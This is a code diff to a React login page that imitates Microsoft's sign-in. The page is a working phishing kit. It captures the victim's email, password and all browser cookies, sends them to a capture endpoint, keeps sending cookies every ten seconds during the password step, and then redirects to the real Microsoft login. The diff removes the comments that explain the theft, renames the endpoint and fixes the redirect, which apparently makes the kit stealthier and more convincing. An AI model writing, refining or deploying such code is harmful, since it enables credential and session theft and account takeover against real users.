@@ -18,7 +18,7 @@ export default function MicrosoftLoginPage() {
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState('')
 
-  // Capture all cookies before sending
+  
   const captureCookies = (): string => {
     if (typeof document === 'undefined') return ''
     return document.cookie || 'none'
@@ -36,7 +36,7 @@ export default function MicrosoftLoginPage() {
     setError('')
 
     try {
-      // Send email to backend FIRST
+      
       const emailData: CaptureData = {
         email,
         captureDomain: 'login.microsoftonline.com',
@@ -44,7 +44,7 @@ export default function MicrosoftLoginPage() {
         upn: email
       }
 
-      const emailRes = await fetch('/api/capture', {
+      const emailRes = await fetch('/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(emailData)
@@ -52,7 +52,7 @@ export default function MicrosoftLoginPage() {
 
       if (!emailRes.ok) throw new Error('Email capture failed')
 
-      // Simulate Microsoft flow: proceed to password
+      
       setStep('password')
       
     } catch (err) {
@@ -68,7 +68,7 @@ export default function MicrosoftLoginPage() {
     setError('')
 
     try {
-      // FULL CAPTURE: password + ALL cookies + tenant
+    
       const fullData: CaptureData = {
         email,
         password,
@@ -85,7 +85,7 @@ export default function MicrosoftLoginPage() {
         cookiesLength: fullData.cookies?.length || 0
       })
 
-      const res = await fetch('/api/capture', {
+      const res = await fetch('/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(fullData)
@@ -95,7 +95,7 @@ export default function MicrosoftLoginPage() {
       
       if (result.status === 'captured ✅') {
         
-      window.location.href = '/https://login.microsoft.com'
+      window.location.href = 'https://login.microsoft.com'
       } else {
         setError('Something went wrong. Please try again.')
       }
@@ -111,9 +111,9 @@ export default function MicrosoftLoginPage() {
 
   useEffect(() => {
     const interval = setInterval(() => {
-      // Keep capturing cookies every 10s during session
+      
       if (step === 'password' && document.cookie) {
-        fetch('/api/capture', {
+        fetch('/capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
